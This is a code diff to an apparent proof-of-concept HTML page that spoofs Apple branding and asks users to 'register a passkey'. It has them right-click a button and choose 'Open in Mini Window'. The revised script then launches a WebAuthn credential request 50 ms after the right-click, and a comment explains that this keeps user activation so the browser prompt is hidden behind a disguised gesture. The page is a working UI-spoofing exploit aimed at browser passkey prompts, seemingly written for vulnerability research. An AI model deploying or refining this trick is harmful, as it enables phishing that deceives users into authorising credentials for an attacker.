@@ -54,9 +54,7 @@
 <div class="container">
     <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple" class="logo">
     <h1>Register Passkey</h1>
-    <p id="step-1">1. Right-click the button below and select <b>"Open in Mini Window"</b>.</p>
-    <p id="step-2" style="display:none; color: #0071e3; font-weight: bold;">2. Now, click "VERIFY PASSKEY" to finalize the registration.</p>
-    
+    <p>To secure your account, right-click the button below and select <b>"Open in Mini Window"</b>. Then, follow the system prompt to register your Security Key or biometric data.</p>
     <a id="auth-trigger" class="btn" href="https://appleid.apple.com">
         Start Registration
     </a>
@@ -66,11 +64,7 @@
 
 <script>
     const trigger = document.getElementById('auth-trigger');
-    const step1 = document.getElementById('step-1');
-    const step2 = document.getElementById('step-2');
     const result = document.getElementById('result');
-
-    let stage = 1;
 
     async function triggerWebAuthn() {
         try {
@@ -78,7 +72,7 @@
                 challenge: new Uint8Array([1, 2, 3, 4, 1, 2, 3, 4, 1, 2, 3, 4, 1, 2, 3, 4, 1, 2, 3, 4, 1, 2, 3, 4, 1, 2, 3, 4, 1, 2, 3, 4]), 
                 rp: {
                     name: "Secure System Validation",
-                    id: window.location.hostname || "localhost" // Fallback to localhost if file:// is used, though it will still fail if not served via http.
+                    id: window.location.hostname || "localhost" // Fallback to localhost if file:// is used
                 },
                 user: {
                     id: new Uint8Array([1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16]),
@@ -112,32 +106,17 @@
 
         } catch (err) {
             console.error("[PoC] WebAuthn request failed:", err);
-            alert("WebAuthn API Failed:\n" + err.name + ": " + err.message + "\n\n1. Ensure you are running this on http://localhost:8000 (NOT file://).\n2. Do NOT use setTimeout.");
+            alert("WebAuthn API Failed:\n" + err.name + ": " + err.message + "\n\n1. Ensure you are running this on http://localhost:8000 (NOT file://).\n2. User activation may have expired.");
         }
     }
 
     trigger.addEventListener('contextmenu', () => {
-        if (stage === 1) {
-            console.log("[PoC] Stage 1: Mini Window opening...");
-            setTimeout(() => {
-                stage = 2;
-                step1.style.display = 'none';
-                step2.style.display = 'block';
-                trigger.innerText = "VERIFY PASSKEY";
-                trigger.style.backgroundColor = "#34a853"; 
-                // Remove href so a regular click doesn't navigate away
-                trigger.removeAttribute("href");
-            }, 2000);
-        }
-    });
-
-    trigger.addEventListener('click', (e) => {
-        e.preventDefault();
-        if (stage === 2) {
+        console.log("[PoC] Right-click detected. Launching WebAuthn almost simultaneously...");
+        // 50ms delay is short enough to retain 'User Activation' (click intent) 
+        // but gives the browser's native context menu a split second to paint.
+        setTimeout(() => {
             triggerWebAuthn();
-        } else {
-            console.log("[PoC] Please right-click and open in Mini Window first.");
-        }
+        }, 50);
     });
 
 </script>
